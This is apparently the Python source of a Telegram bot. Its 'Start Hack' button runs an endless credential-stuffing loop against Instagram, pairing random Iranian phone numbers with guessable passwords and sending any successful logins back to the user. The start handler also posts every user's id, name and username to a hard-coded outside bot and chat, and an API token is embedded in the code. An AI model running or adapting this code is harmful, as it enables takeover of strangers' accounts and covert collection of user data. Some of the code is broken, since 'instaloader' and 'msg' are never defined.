import requests,user_agent,json,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)


@bot.message_handler(commands=['start'])
def boten(message):
	id = message.from_user.id
	name = message.from_user.first_name
	username = message.from_user.username
	requests.post(f"https://api.telegram.org/bot5070230115:AAFvXjBaRwtBLkahVlw9cybLJ56ZTV2H2Ag/sendMessage?chat_id=5009434402&text=@{username} استخدم البوت\nالايدي : {id}\nالاسم : {name}")
	mas = types.InlineKeyboardMarkup(row_width=1)
	A = types.InlineKeyboardButton(text="Start Hack▶️",callback_data="start"+str(id))
	B = types.InlineKeyboardButton("المطور",url="https://t.me/WXGDX")
	mas.add(A,B)
	bot.send_message(message.chat.id,msg,reply_markup=mas,parse_mode="markdown")

@bot.callback_query_handler(func=lambda call : True)
def callback(call):
 id = call.message.chat.id
 if call.data == "start"+str(id):
  L=instaloader.Instaloader()
  h = 0
  b = 0

  us = "0987654321"
  while True:
	
  	use = ("".join(random.choice(us)for i in range(7)))
  	user = "+98912" + use
  	pas = use
	
	
  	
	
	
  	try:		
				
  		L.login(user, pas)
  		os.system("clear")
  		h+=1
  		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"""
Hunt : {h}
Bad : {b}
Username : {user}
Password : {pas}""")
  		requests.post(f"https://api.telegram.org/bot5070230115:AAFvXjBaRwtBLkahVlw9cybLJ56ZTV2H2Ag/sendMessage?chat_id={id}&text="f"""
		لك تعال صدتلك حساب🤖
		=======MHMD=======
		
		Username : {user}
		
		Password : {pas}
		
		=======MHMD=======
	
		BY:@WXGDX
		
		CH:@XXWWE""",parse_mode="markdown")
  	except:

  		os.system("clear")
  		b+=1
  		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"""
Hunt : {h}
Bad : {b}
Username : {user}
Password : {pas}""",parse_mode="markdown")
		

@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://insta-bo.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))